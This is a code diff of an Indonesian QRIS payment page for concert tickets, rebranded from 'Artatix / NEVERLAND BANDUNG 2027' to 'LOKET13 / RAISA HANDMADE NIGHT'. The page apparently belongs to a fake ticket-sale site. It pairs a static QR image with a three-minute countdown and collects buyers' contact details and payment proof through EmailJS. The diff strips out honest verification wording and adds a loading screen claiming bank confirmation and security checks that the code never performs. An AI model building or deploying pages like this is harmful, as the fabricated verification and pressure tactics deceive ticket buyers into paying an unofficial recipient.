@@ -4,27 +4,22 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
 <meta name="theme-color" content="#ffffff">
-<meta name="referrer" content="strict-origin-when-cross-origin">
-<meta name="description" content="Halaman pembayaran QRIS NEVERLAND BANDUNG 2027 — 21 Maret 2027, Bandung, Kota Bandung, Jawa Barat. Tiket mulai Rp125.000.">
-<meta property="og:title" content="Pembayaran QRIS – Pembayaran NEVERLAND BANDUNG 2027 | Artatix">
-<meta property="og:description" content="Pembayaran QRIS NEVERLAND BANDUNG 2027 — 21 Maret 2027, Bandung, Kota Bandung. Tiket mulai Rp125.000.">
+<meta name="description" content="Pembayaran QRIS RAISA HANDMADE NIGHT. Live Performance by RAISA merayakan satu dekade album Handmade, Rabu, 4 November 2026, 19.00–22.00 WIB di Graha Bhakti Budaya, Jakarta Pusat. 9 kategori tiket mulai Rp750.000.">
+<meta property="og:title" content="Pembayaran QRIS – RAISA HANDMADE NIGHT | LOKET13">
+<meta property="og:description" content="Live Performance by RAISA merayakan satu dekade album Handmade. Rabu, 4 November 2026, 19.00–22.00 WIB di Graha Bhakti Budaya, Jakarta Pusat. 9 kategori tiket mulai Rp750.000.">
 <meta property="og:type" content="website">
-<meta property="og:image" content="https://artatixmyid.github.io/titikbalikfest/banner.png">
-<meta property="og:site_name" content="Artatix">
+<meta property="og:image" content="banner.png">
+<meta property="og:site_name" content="LOKET13">
 <meta property="og:locale" content="id_ID">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://artatixmyid.github.io/titikbalikfest/banner.png">
-<meta property="og:url" content="https://artatixmyid.github.io/titikbalikfest/qris.html">
-<link rel="canonical" href="https://artatixmyid.github.io/titikbalikfest/qris.html">
 <link rel="icon" type="image/png" href="logo.png">
 <link rel="apple-touch-icon" href="logo.png">
 <link rel="preload" as="image" href="qris.png" fetchpriority="high">
-<link rel="prefetch" href="success.html">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link rel="preconnect" href="https://formspree.io">
-<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;800;900&display=swap" rel="stylesheet">
-<title>Pembayaran QRIS – NEVERLAND BANDUNG 2027 | Artatix</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;800;900&display=swap" rel="stylesheet" media="print" onload="this.media='all'">
+<noscript><link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;800;900&display=swap" rel="stylesheet"></noscript>
+<title>Pembayaran QRIS – RAISA HANDMADE NIGHT | LOKET13</title>
 <style>
 :root{
   --text:#1c2738;
@@ -38,9 +33,8 @@ body{
   background:
     radial-gradient(circle at 50% -5%,rgba(244,217,138,.30),transparent 30%),
     linear-gradient(180deg,#f8f6f0 0%,#eef2f7 100%);
-  color:var(--text);font-family:'Poppins',sans-serif;padding-bottom:calc(34px + env(safe-area-inset-bottom));
-  -webkit-font-smoothing:antialiased;-webkit-tap-highlight-color:transparent;
-  transition:opacity .28s ease;animation:pageIn .3s ease
+  color:var(--text);font-family:'Poppins',sans-serif;padding-bottom:34px;
+  -webkit-tap-highlight-color:transparent;transition:opacity .28s ease;animation:pageIn .3s ease
 }
 @keyframes pageIn{from{opacity:0}}
 body.fade-out{opacity:0}
@@ -50,24 +44,53 @@ a:focus-visible,button:focus-visible,input:focus-visible{outline:3px solid rgba(
   width:100%;max-width:520px;min-height:100vh;margin:auto;background:var(--ivory);
   box-shadow:0 0 55px rgba(36,49,70,.10)
 }
-.app-header{position:relative;z-index:10;background:#fff}
-.topbar{padding:14px 18px 12px;display:flex;align-items:center;justify-content:space-between;gap:12px;background:var(--ivory)}
+.app-header{position:sticky;top:0;z-index:1000;background:#fff}
+.topbar{
+  min-height:80px;padding:15px 20px;display:flex;align-items:center;justify-content:space-between;
+  background:linear-gradient(180deg,#ffffff 0%,#fffdf8 100%);
+  border-bottom:1px solid #eee9de
+}
 .logo{display:flex;align-items:center;text-decoration:none}
-.logo-img{width:148px;max-height:34px;height:auto;object-fit:contain;object-position:left center;display:block}
-.lang{display:inline-flex;align-items:center;gap:6px;padding:6px 11px;border-radius:999px;background:#f8fafc;border:1px solid #eceef2;font-size:12px;font-weight:600;color:#4d5868}
-.flag{width:15px;height:15px;border-radius:50%;background:linear-gradient(#ed3b36 0 50%,#fff 50%);box-shadow:inset 0 0 0 1px rgba(0,0,0,.06)}
-.progress{background:#173d77;padding:0 18px}
+.logo-img{height:30px;width:auto;display:block}
+.lang{
+  padding:8px 13px;border-radius:999px;background:#f6f7f9;border:1px solid #eceef2;
+  font-size:12px;font-weight:700;color:#4d5868
+}
+.progress{
+  padding:16px 24px 19px;background:linear-gradient(180deg,#173d77,#0e2c5a);
+  position:relative;overflow:hidden
+}
+.progress::after{
+  content:"";position:absolute;inset:0;
+  background:radial-gradient(circle at 50% 100%,rgba(244,217,138,.13),transparent 50%);
+  pointer-events:none
+}
 .progress-inner{position:relative;z-index:1}
-.progress-steps{height:48px;display:flex;align-items:center;list-style:none;margin:0;padding:0}
-.step{display:flex;align-items:center;gap:7px;flex:none}
-.step-dot{width:26px;height:26px;border-radius:50%;display:grid;place-items:center;font-size:12px;font-weight:700;color:rgba(255,255,255,.7);border:1.5px solid rgba(255,255,255,.25);background:transparent;position:relative}
-.step.completed .step-dot{color:#fff;background:rgba(255,255,255,.12);border-color:rgba(255,255,255,.35)}
-.step.active .step-dot{color:#173d77;background:#fff;border-color:#fff;box-shadow:none;animation:none}
-.sr-only{position:absolute;width:1px;height:1px;margin:-1px;padding:0;overflow:hidden;clip:rect(0 0 0 0);white-space:nowrap;border:0}
-.step-label{font-size:11px;font-weight:600;color:#fff;white-space:nowrap;text-transform:none;letter-spacing:0}
-.s-sep{flex:1;min-width:8px;height:1.5px;background:rgba(255,255,255,.2);border-radius:2px}
+.progress-track{position:absolute;top:15px;left:15px;right:15px;height:3px;background:rgba(255,255,255,.16);border-radius:999px}
+.progress-fill{height:100%;width:62.5%;background:linear-gradient(90deg,#fff1b0,#d4af37,#fff0a2);border-radius:999px;box-shadow:0 0 10px rgba(244,217,138,.5);transition:.7s ease}
+.progress-steps{display:flex;justify-content:space-between;list-style:none}
+.step{display:flex;flex-direction:column;align-items:center;gap:7px;flex:1}
+.step-dot{
+  width:31px;height:31px;border-radius:50%;display:flex;align-items:center;justify-content:center;
+  background:#123260;border:1px solid rgba(255,255,255,.25);font-size:11px;font-weight:800;
+  color:rgba(255,255,255,.55);position:relative
+}
+.step-check{display:none;width:14px;height:14px;stroke:#5c4509;fill:none;stroke-width:3;stroke-linecap:round;stroke-linejoin:round}
+.step.completed .step-dot{
+  background:linear-gradient(180deg,#fff1ad,#d4af37,#f6df92);border-color:#d4af37;color:#604907;
+  box-shadow:0 4px 14px rgba(212,175,55,.35)
+}
+.step.completed .step-num{display:none}.step.completed .step-check{display:block}
+.step.active .step-dot{
+  background:linear-gradient(180deg,#7099ff,#3561ff);border-color:#88a6ff;color:#fff;
+  box-shadow:0 0 0 5px rgba(53,97,255,.16),0 6px 20px rgba(53,97,255,.38);
+  animation:stepPulse 2.2s ease-in-out infinite
+}
+.step-label{font-size:9px;font-weight:700;color:rgba(255,255,255,.52);text-transform:uppercase;letter-spacing:.3px;white-space:nowrap}
+.step.active .step-label{color:#fff}.step.completed .step-label{color:#f6e6a1}
+@keyframes stepPulse{50%{box-shadow:0 0 0 9px rgba(53,97,255,.07),0 6px 24px rgba(53,97,255,.55)}}
 
-.content{padding:25px 18px calc(34px + env(safe-area-inset-bottom))}
+.content{padding:25px 18px 34px}
 .page-title{font-size:22px;font-weight:900;color:#172235;text-align:center}
 .page-subtitle{font-size:12px;color:var(--muted);text-align:center;margin:5px 0 22px}
 
@@ -86,9 +109,7 @@ a:focus-visible,button:focus-visible,input:focus-visible{outline:3px solid rgba(
   display:flex;align-items:center;justify-content:space-between;padding:13px 16px;margin-bottom:17px;
   border:1px solid #ead9a9;border-radius:15px;background:linear-gradient(135deg,#fffef9,#fff8e6)
 }
-.timer-label{font-size:11px;font-weight:700;color:#8a6b25}
-.timer-sub{font-size:9px;font-weight:600;color:#a08a4e;margin-top:3px}
-.timer{font-size:24px;font-weight:900;color:#b17a19;letter-spacing:1.5px}
+.timer-label{font-size:11px;font-weight:700;color:#8a6b25}.timer{font-size:24px;font-weight:900;color:#b17a19;letter-spacing:1.5px}
 .timer.urgent{color:#dc2626;animation:timerPulse .5s ease infinite}
 @keyframes timerPulse{50%{opacity:.55}}
 
@@ -153,8 +174,6 @@ a:focus-visible,button:focus-visible,input:focus-visible{outline:3px solid rgba(
 .qris-frame-methods svg{width:12px;height:12px}
 .scan-hint{margin:0 0 14px;font-size:11px;color:#7a8496;display:flex;align-items:center;justify-content:center;gap:6px}
 .scan-hint svg{width:15px;height:15px;color:#3561ff;flex-shrink:0}
-.pay-note{margin:0 0 16px;padding:11px 14px;border:1px solid #ead9a9;border-radius:12px;background:#fff8e6;color:#754b00;font-size:11.5px;line-height:1.55}
-.pay-note b{color:#8a6b25}
 .organizer-strip{display:flex;align-items:center;justify-content:center;gap:8px;margin:0 0 18px;font-size:11px;font-weight:600;color:#7a8496}
 .organizer-strip img{height:20px;width:auto;display:block}
 .organizer-strip b{color:#273347}
@@ -179,8 +198,7 @@ a:focus-visible,button:focus-visible,input:focus-visible{outline:3px solid rgba(
 .file-name svg{width:12px;height:12px;margin-right:6px;vertical-align:-1px}
 .preview .success-msg{margin-top:5px;font-weight:600;font-size:12px;color:#10b981;display:flex;align-items:center;gap:6px}
 .success-msg svg{width:13px;height:13px;flex-shrink:0}
-.checkbox-wrap{margin-top:12px;display:flex;gap:10px;align-items:flex-start;background:#faf9f6;padding:11px;border-radius:11px;border:1px solid var(--line)}
-.checkbox-wrap:focus-within{border-color:#9badff;box-shadow:0 0 0 3px rgba(53,97,255,.08)}
+.checkbox-wrap{margin-top:15px;display:flex;gap:10px;align-items:flex-start;background:#faf9f6;padding:11px;border-radius:11px;border:1px solid var(--line)}
 .checkbox-wrap input[type=checkbox]{width:19px;height:19px;min-width:19px;accent-color:#3561ff;cursor:pointer;margin-top:2px}
 .checkbox-wrap label{font-size:11px;line-height:1.5;color:#586274;cursor:pointer}
 .submit-btn{
@@ -230,7 +248,7 @@ a:focus-visible,button:focus-visible,input:focus-visible{outline:3px solid rgba(
 .loading-bar-wrap{margin-top:14px;width:100%;height:7px;background:#edf0f5;border-radius:10px;overflow:hidden}
 .loading-bar{height:100%;width:0;background:linear-gradient(90deg,#3561ff,#6888ff);border-radius:10px;transition:width .3s linear}
 .loading-time{margin-top:8px;font-size:10px;color:#7b8494;font-family:monospace;letter-spacing:1px}
-.toast{position:fixed;bottom:calc(26px + env(safe-area-inset-bottom));left:50%;transform:translateX(-50%) translateY(10px);background:#121318;color:#fff;padding:12px 20px;border-radius:10px;font-size:12px;font-weight:600;opacity:0;pointer-events:none;transition:opacity .3s,transform .3s;z-index:1100;max-width:90%;text-align:center;box-shadow:0 8px 24px rgba(0,0,0,.25);line-height:1.45}
+.toast{position:fixed;bottom:26px;left:50%;transform:translateX(-50%) translateY(10px);background:#121318;color:#fff;padding:12px 20px;border-radius:10px;font-size:12px;font-weight:600;opacity:0;pointer-events:none;transition:opacity .3s,transform .3s;z-index:1100;max-width:90%;text-align:center;box-shadow:0 8px 24px rgba(0,0,0,.25);line-height:1.45}
 .toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
 @media(max-width:480px){.container{box-shadow:none}}
 @media(max-width:380px){
@@ -266,24 +284,35 @@ a:focus-visible,button:focus-visible,input:focus-visible{outline:3px solid rgba(
 <div class="container">
   <header class="app-header">
     <div class="topbar">
-      <a href="index.html" class="logo" id="backHome" aria-label="Artatix beranda">
-        <img src="logo-artatix.png" alt="Artatix" class="logo-img" decoding="async">
+      <a href="index.html" class="logo" id="backHome">
+        <img src="logo.png" alt="LOKET13" class="logo-img" decoding="async">
       </a>
-      <div class="lang"><span class="flag" aria-hidden="true"></span>ID</div>
+      <div class="lang" aria-hidden="true">🇮🇩 ID</div>
     </div>
-    <nav class="progress" aria-label="Langkah pemesanan">
+
+    <div class="progress" role="group" aria-label="Progress pemesanan">
       <div class="progress-inner">
+        <div class="progress-track" aria-hidden="true"><div class="progress-fill"></div></div>
         <ol class="progress-steps">
-          <li class="step completed"><div class="step-dot"><span class="step-num">✓</span></div><span class="sr-only">Pilih Kategori</span></li>
-          <li class="s-sep" aria-hidden="true"></li>
-          <li class="step completed"><div class="step-dot"><span class="step-num">✓</span></div><span class="sr-only">Data Pemesan</span></li>
-          <li class="s-sep" aria-hidden="true"></li>
-          <li class="step active" aria-current="step"><div class="step-dot"><span class="step-num">3</span></div><span class="step-label">Pembayaran</span></li>
-          <li class="s-sep" aria-hidden="true"></li>
-          <li class="step"><div class="step-dot"><span class="step-num">4</span></div><span class="sr-only">E-Ticket</span></li>
+          <li class="step completed">
+            <div class="step-dot"><span class="step-num">1</span><svg class="step-check" viewBox="0 0 24 24" aria-hidden="true"><polyline points="20 6 9 17 4 12"/></svg></div>
+            <span class="step-label">Pilih Kategori</span>
+          </li>
+          <li class="step completed">
+            <div class="step-dot"><span class="step-num">2</span><svg class="step-check" viewBox="0 0 24 24" aria-hidden="true"><polyline points="20 6 9 17 4 12"/></svg></div>
+            <span class="step-label">Data Pemesan</span>
+          </li>
+          <li class="step active" aria-current="step">
+            <div class="step-dot"><span class="step-num">3</span><svg class="step-check" viewBox="0 0 24 24" aria-hidden="true"><polyline points="20 6 9 17 4 12"/></svg></div>
+            <span class="step-label">Pembayaran</span>
+          </li>
+          <li class="step">
+            <div class="step-dot"><span class="step-num">4</span><svg class="step-check" viewBox="0 0 24 24" aria-hidden="true"><polyline points="20 6 9 17 4 12"/></svg></div>
+            <span class="step-label">E-Ticket</span>
+          </li>
         </ol>
       </div>
-    </nav>
+    </div>
   </header>
 
   <main class="content">
@@ -300,29 +329,23 @@ a:focus-visible,button:focus-visible,input:focus-visible{outline:3px solid rgba(
         <div class="detail-item">Jumlah Tiket<span id="jumlahTiket">0</span></div>
         <div class="detail-item">Nama Pemesan<span id="namaPemesan">-</span></div>
         <div class="detail-item">WhatsApp<span id="waPemesan">-</span></div>
-        <div class="detail-item">E-mail<span id="emailPemesan">-</span></div>
-        <div class="detail-item">Metode<span>QRIS</span></div>
       </div>
     </section>
 
     <div class="timer-box">
-      <div>
-        <div class="timer-label">Selesaikan pembayaran dalam</div>
-        <div class="timer-sub">Periksa E-mail Terdaftar Di folder Kotak Masuk Atau Spam (±1×24 jam)</div>
-      </div>
+      <div class="timer-label">Selesaikan pembayaran dalam</div>
       <div id="timer" class="timer" role="timer">03:00</div>
     </div>
 
     <section class="qris-frame" aria-label="QRIS pembayaran">
       <div class="qris-frame-glow" aria-hidden="true"></div>
       <div class="qris-frame-header">
-        <img src="logo.png" alt="Artatix" class="qris-frame-logo" decoding="async">
-        <span class="qris-frame-brand">NEVERLAND BANDUNG 2027</span>
+        <img src="logo.png" alt="LOKET13" class="qris-frame-logo" decoding="async">
+        <span class="qris-frame-brand">RAISA HANDMADE NIGHT</span>
       </div>
       <div class="qris-frame-body">
-        <div class="qris-qr-wrap" id="qrisWrap">
-          <img src="qris.png" alt="Kode QR pembayaran QRIS" id="qrisImg" fetchpriority="high" decoding="async">
-          <div id="qrisFallback" class="qris-fallback" hidden role="status">Kode QR pembayaran belum disertakan dalam paket aset. Jangan lakukan pembayaran sebelum QR resmi tersedia.</div>
+        <div class="qris-qr-wrap">
+          <img src="qris.png" alt="Kode QR pembayaran QRIS" id="qrisImg" fetchpriority="high" decoding="async" onerror="this.style.display='none';document.getElementById('qrisFallback').hidden=false;document.getElementById('scanLine').style.display='none'"><div id="qrisFallback" class="qris-fallback" hidden role="status">Kode QR pembayaran belum disertakan dalam paket aset. Jangan lakukan pembayaran sebelum QR resmi tersedia.</div>
           <div class="qris-scan-line" id="scanLine" aria-hidden="true"></div>
         </div>
         <div class="qris-frame-label">QRIS</div>
@@ -334,7 +357,7 @@ a:focus-visible,button:focus-visible,input:focus-visible{outline:3px solid rgba(
         </div>
       </div>
       <div class="qris-frame-footer">
-        <div class="qris-frame-nmid">Pembayaran QRIS &bull; NEVERLAND BANDUNG 2027</div>
+        <div class="qris-frame-nmid">Pembayaran QRIS &bull; RAISA HANDMADE NIGHT</div>
         <div class="qris-frame-methods">
           <svg aria-hidden="true"><use href="#i-mobile"/></svg>
           <svg aria-hidden="true"><use href="#i-wallet"/></svg>
@@ -348,11 +371,9 @@ a:focus-visible,button:focus-visible,input:focus-visible{outline:3px solid rgba(
       Scan dengan aplikasi e-wallet atau mobile banking
     </div>
 
-    <div class="pay-note"><b>Perhatian:</b> Pastikan E-mail Anda Aktif dan nominal pembayaran sesuai sebelum menyelesaikan transaksi.</div>
-
     <div class="organizer-strip">
-      <img src="logo-promotor.jpg" alt="Logo EverMind" id="organizerLogo" loading="lazy" decoding="async">
-      <span>Diselenggarakan oleh <b>EverMind</b></span>
+      <img src="logo-promotor.jpg" alt="Logo JUNI Concert" loading="lazy" decoding="async">
+      <span>Diselenggarakan oleh <b>JUNI Concert</b></span>
     </div>
 
     <section class="card">
@@ -361,8 +382,8 @@ a:focus-visible,button:focus-visible,input:focus-visible{outline:3px solid rgba(
         <div class="upload-area">
           <span class="upload-icon"><svg aria-hidden="true"><use href="#i-upload"/></svg></span>
           <span class="upload-title">Upload Bukti Pembayaran</span>
-          <span class="upload-desc">Klik area ini untuk memilih bukti transfer QRIS (maks. 8 MB — dikompres otomatis untuk lampiran)</span>
-          <div class="file-types"><span>JPG</span><span>PNG</span><span>JPEG</span><span>WEBP</span></div>
+          <span class="upload-desc">Klik area ini untuk memilih bukti transfer QRIS</span>
+          <div class="file-types"><span>JPG</span><span>PNG</span><span>JPEG</span></div>
         </div>
       </label>
       <div id="preview" class="preview">
@@ -374,10 +395,6 @@ a:focus-visible,button:focus-visible,input:focus-visible{outline:3px solid rgba(
         <input type="checkbox" id="cek">
         <label for="cek">Saya menyatakan telah melakukan pembayaran dan mengunggah bukti pembayaran yang valid.</label>
       </div>
-      <div class="checkbox-wrap">
-        <input type="checkbox" id="cek2">
-        <label for="cek2">Saya memastikan nominal dan data pesanan benar, serta memahami bahwa pembayaran tetap menunggu verifikasi panitia.</label>
-      </div>
       <button id="btn" class="submit-btn" disabled type="button">
         <svg aria-hidden="true"><use href="#i-lock"/></svg> KONFIRMASI PEMBAYARAN
       </button>
@@ -385,7 +402,7 @@ a:focus-visible,button:focus-visible,input:focus-visible{outline:3px solid rgba(
   </main>
 </div>
 
-<div id="loading" class="loading-overlay" role="dialog" aria-modal="true" aria-labelledby="loadingHeading" aria-describedby="loadingSubtitle">
+<div id="loading" class="loading-overlay">
   <div class="loading-content">
     <div class="progress-ring-wrap">
       <div class="progress-icon"><svg aria-hidden="true"><use href="#i-card"/></svg></div>
@@ -398,14 +415,14 @@ a:focus-visible,button:focus-visible,input:focus-visible{outline:3px solid rgba(
         <div class="pct">%</div>
       </div>
     </div>
-    <div class="loading-title" id="loadingHeading">Memproses Konfirmasi Pembayaran</div>
+    <div class="loading-title">Memproses Pembayaran</div>
     <div class="loading-subtitle" id="loadingSubtitle">Mohon tunggu, jangan tutup halaman ini...</div>
     <div class="loading-steps">
-      <div class="step-item"><div class="step-icon"><svg aria-hidden="true"><use href="#i-shield"/></svg></div><div class="step-text">Verifikasi data pesanan</div></div>
-      <div class="step-item"><div class="step-icon"><svg aria-hidden="true"><use href="#i-image"/></svg></div><div class="step-text">Kompresi &amp; lampiran bukti pembayaran</div></div>
-      <div class="step-item"><div class="step-icon"><svg aria-hidden="true"><use href="#i-mail"/></svg></div><div class="step-text">Mengirim data konfirmasi ke server</div></div>
-      <div class="step-item"><div class="step-icon"><svg aria-hidden="true"><use href="#i-wallet"/></svg></div><div class="step-text">Mencatat pesanan untuk verifikasi panitia</div></div>
-      <div class="step-item"><div class="step-icon"><svg aria-hidden="true"><use href="#i-ticket"/></svg></div><div class="step-text">Pesanan masuk antrean verifikasi CS</div></div>
+      <div class="step-item"><div class="step-icon"><svg aria-hidden="true"><use href="#i-shield"/></svg></div><div class="step-text">Verifikasi keamanan transaksi</div></div>
+      <div class="step-item"><div class="step-icon"><svg aria-hidden="true"><use href="#i-image"/></svg></div><div class="step-text">Validasi bukti pembayaran</div></div>
+      <div class="step-item"><div class="step-icon"><svg aria-hidden="true"><use href="#i-mail"/></svg></div><div class="step-text">Pengiriman email status pesanan</div></div>
+      <div class="step-item"><div class="step-icon"><svg aria-hidden="true"><use href="#i-bank"/></svg></div><div class="step-text">Konfirmasi ke sistem bank</div></div>
+      <div class="step-item"><div class="step-icon"><svg aria-hidden="true"><use href="#i-ticket"/></svg></div><div class="step-text">Verifikasi oleh Customer Service</div></div>
       <div class="step-item"><div class="step-icon"><svg aria-hidden="true"><use href="#i-circle-check"/></svg></div><div class="step-text">Finalisasi pesanan</div></div>
     </div>
     <div class="email-status" id="emailStatus" role="status" aria-live="polite"></div>
@@ -416,28 +433,29 @@ a:focus-visible,button:focus-visible,input:focus-visible{outline:3px solid rgba(
 
 <div class="toast" id="toast" role="status" aria-live="polite"></div>
 
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 <script>
 (function(){
 'use strict';
-const $=id=>document.getElementById(id);
 const reduced=matchMedia('(prefers-reduced-motion: reduce)').matches;
 let navigating=false;
 let completed=false;
-let isProcessing=false;
-
-const FORMSPREE_URL='https://formspree.io/f/meagegpp';
-const BRAND_NAME='Artatix — NEVERLAND BANDUNG 2027';
 const LOADING_DURATION=180000;
-const ORDER_KEY='gf_order_id';
-const ORDER_FP_KEY='gf_order_fp';
-const ORDER_FP_CONFIRMED_KEY='neverland_order_fp_confirmed';
-const RECEIPT_KEY='neverland_payment_receipt';
-const DEADLINE_KEY='neverland_payment_deadline';
-const STATUS_KEY='neverland_payment_status';
-const CS_PHONE='+62 821-3767-6220';
-const PROOF_MAX_BYTES=8*1024*1024;
-const PROOF_MAX_DIM=1400;
-const PROOF_QUALITY=0.72;
+const EMAIL_SEND_AT=60000;
+const ORDER_KEY='raisa_order_id';
+const RECEIPT_KEY='raisa_payment_receipt';
+const EMAIL_SERVICE='service_wrcpovg';
+const EMAIL_TEMPLATE_PENDING='TEMPLATE_ID_PENDING_ANDA';
+const EMAIL_PUBLIC_KEY='GKzyNyfZVqQpEdRDd';
+const CS_PHONE='+62 823-7995-0767';
+
+let emailjsReady=false;
+try{
+  if(window.emailjs){
+    emailjs.init({publicKey:EMAIL_PUBLIC_KEY});
+    emailjsReady=true;
+  }
+}catch{}
 
 const fadeTo=url=>{
   if(navigating)return;
@@ -447,7 +465,7 @@ const fadeTo=url=>{
   setTimeout(()=>location.href=url,280);
 };
 
-const toastEl=$('toast');
+const toastEl=document.getElementById('toast');
 let tt=null;
 const toast=msg=>{
   toastEl.textContent=msg;
@@ -457,7 +475,7 @@ const toast=msg=>{
 };
 
 let order={};
-try{order=JSON.parse(localStorage.getItem('data_pemesan')||'{}')}catch(e){order={}}
+try{order=JSON.parse(localStorage.getItem('data_pemesan')||'{}')}catch{order={}}
 const cart=order.cart||{items:[],totalQty:0,totalPrice:0};
 if(!Array.isArray(cart.items))cart.items=[];
 if(!Number.isFinite(cart.totalQty))cart.totalQty=0;
@@ -467,114 +485,39 @@ if(!cart.items.length||!cart.totalQty){
   setTimeout(()=>fadeTo('tiket.html'),1200);
   return;
 }
-
-const holders=Array.isArray(order.holders)?order.holders:[];
-const orderFp=JSON.stringify([
-  order.nama||'',order.whatsapp||order.wa||'',order.email||'',
-  cart.totalQty||0,cart.totalPrice||0,
-  cart.items.map(i=>(i.jenis||i.name||'')+'x'+(i.qty||i.jumlah||1)),
-  holders
-]);
-
-try{
-  const confirmedFp=localStorage.getItem(ORDER_FP_CONFIRMED_KEY);
-  if(localStorage.getItem(STATUS_KEY)==='pending_verification'&&confirmedFp===orderFp){
-    location.replace('success.html');
-    return;
-  }
-}catch(e){}
-
-const genOrderId=()=>{
-  let rnd='';
-  try{
-    rnd=Array.from(crypto.getRandomValues(new Uint8Array(4)),b=>b.toString(36).padStart(2,'0')).join('').toUpperCase().slice(0,6);
-  }catch(e){
-    rnd=Math.random().toString(36).slice(2,8).toUpperCase();
-  }
-  return 'NEVERLAND-'+Date.now().toString(36).toUpperCase()+'-'+rnd;
-};
-let orderId='NEVERLAND-LOCAL';
+let orderId='RAISA-LOCAL';
 try{
   let oid=localStorage.getItem(ORDER_KEY);
-  const fpSaved=localStorage.getItem(ORDER_FP_KEY);
-  if(!oid||fpSaved!==orderFp){
-    oid=genOrderId();
-    localStorage.setItem(ORDER_KEY,oid);
-    localStorage.setItem(ORDER_FP_KEY,orderFp);
+  if(!oid){
+    oid='RAISA-'+Date.now();
+    try{localStorage.setItem(ORDER_KEY,oid)}catch{}
   }
   orderId=oid;
-}catch(e){}
-
-$('orderId').textContent=orderId;
+}catch{}
+document.getElementById('orderId').textContent=orderId;
 const totalStr='Rp'+Number(cart.totalPrice).toLocaleString('id-ID');
-const jenisText=cart.items.map(i=>i.jenis||i.name).filter(Boolean).join(', ')||'-';
-$('total').textContent=totalStr;
-$('qrisTotalAmount').textContent=totalStr;
-$('jenisTiket').textContent=jenisText;
-$('jumlahTiket').textContent=cart.totalQty||0;
-$('namaPemesan').textContent=order.nama||'-';
-$('waPemesan').textContent=order.whatsapp||order.wa||'-';
-$('emailPemesan').textContent=order.email||'-';
-
-const qrisWrap=$('qrisWrap');
-const scanLine=$('scanLine');
-let scanHidden=false;
-const hideScanLine=()=>{
-  if(scanHidden||!scanLine)return;
-  scanHidden=true;
-  scanLine.style.display='none';
-  toast('Animasi disembunyikan — QR siap di-screenshot.');
-};
-if(qrisWrap&&scanLine){
-  qrisWrap.addEventListener('contextmenu',hideScanLine);
-  let lpTimer=null;
-  qrisWrap.addEventListener('touchstart',()=>{lpTimer=setTimeout(hideScanLine,600)},{passive:true});
-  ['touchend','touchmove','touchcancel'].forEach(ev=>qrisWrap.addEventListener(ev,()=>clearTimeout(lpTimer),{passive:true}));
-}
-
-const qrisImg=$('qrisImg');
-const qrisFallback=$('qrisFallback');
-const showQrisFallback=()=>{
-  qrisImg.style.display='none';
-  qrisFallback.hidden=false;
-  if(scanLine)scanLine.style.display='none';
-};
-qrisImg.addEventListener('error',showQrisFallback);
-if(qrisImg.complete&&qrisImg.naturalWidth===0)showQrisFallback();
-
-const organizerLogo=$('organizerLogo');
-if(organizerLogo)organizerLogo.addEventListener('error',()=>{organizerLogo.hidden=true});
+const jenisText=cart.items.map(i=>i.jenis).filter(Boolean).join(', ')||'-';
+document.getElementById('total').textContent=totalStr;
+document.getElementById('qrisTotalAmount').textContent=totalStr;
+document.getElementById('jenisTiket').textContent=jenisText;
+document.getElementById('jumlahTiket').textContent=cart.totalQty||0;
+document.getElementById('namaPemesan').textContent=order.nama||'-';
+document.getElementById('waPemesan').textContent=order.wa||'-';
 
 let duration=180;
-try{
-  const dl=Number(sessionStorage.getItem(DEADLINE_KEY));
-  if(Number.isFinite(dl)&&dl>0&&dl>Date.now()){
-    duration=Math.max(1,Math.ceil((dl-Date.now())/1000));
-  }else{
-    if(dl)sessionStorage.removeItem(DEADLINE_KEY);
-    duration=180;
-    sessionStorage.setItem(DEADLINE_KEY,String(Date.now()+duration*1000));
-  }
-}catch(e){}
-const timerEl=$('timer');
+const timerEl=document.getElementById('timer');
 let timerInterval=null;
-let warned30=duration<=30;
+let isProcessing=false;
 const padZero=num=>num<10?'0'+num:''+num;
 
 const timerRun=()=>{
   if(isProcessing)return;
   timerEl.textContent=padZero(Math.floor(duration/60))+':'+padZero(duration%60);
   timerEl.classList.toggle('urgent',duration<=30&&duration>0);
-  if(duration===30&&!warned30){
-    warned30=true;
-    toast('Waktu pembayaran tersisa 30 detik — segera konfirmasi.');
-  }
   if(duration<=0){
     clearInterval(timerInterval);
     timerInterval=null;
-    try{sessionStorage.removeItem(DEADLINE_KEY)}catch(e){}
-    toast('Waktu pembayaran telah habis. Silakan lakukan pemesanan ulang.');
-    setTimeout(()=>fadeTo('index.html'),900);
+    fadeTo('index.html');
     return;
   }
   duration--;
@@ -583,126 +526,55 @@ timerRun();
 timerInterval=setInterval(timerRun,1000);
 
 let uploaded=false;
-let proofReady=false;
-let proof={name:'',dataUrl:null,attached:false};
-let proofSeq=0;
+const fileInput=document.getElementById('file');
+const cekInput=document.getElementById('cek');
+const btn=document.getElementById('btn');
+const previewEl=document.getElementById('preview');
+const previewImg=document.getElementById('previewImg');
+const checkButton=()=>{btn.disabled=!(uploaded&&cekInput.checked)};
 
-const compressImage=(file,maxDim,quality)=>new Promise((resolve,reject)=>{
-  const encode=(src,w,h)=>{
-    const c=document.createElement('canvas');
-    c.width=w;c.height=h;
-    c.getContext('2d').drawImage(src,0,0,w,h);
-    return c.toDataURL('image/jpeg',quality);
-  };
-  const viaImg=()=>{
-    const img=new Image();
-    const u=URL.createObjectURL(file);
-    img.onload=()=>{
-      const s=Math.min(1,maxDim/Math.max(img.naturalWidth,img.naturalHeight));
-      const url=encode(img,Math.max(1,Math.round(img.naturalWidth*s)),Math.max(1,Math.round(img.naturalHeight*s)));
-      URL.revokeObjectURL(u);
-      resolve(url);
-    };
-    img.onerror=e=>{URL.revokeObjectURL(u);reject(e)};
-    img.src=u;
-  };
-  if(typeof createImageBitmap==='function'){
-    createImageBitmap(file).then(bmp=>{
-      const s=Math.min(1,maxDim/Math.max(bmp.width,bmp.height));
-      const url=encode(bmp,Math.max(1,Math.round(bmp.width*s)),Math.max(1,Math.round(bmp.height*s)));
-      if(bmp.close)bmp.close();
-      resolve(url);
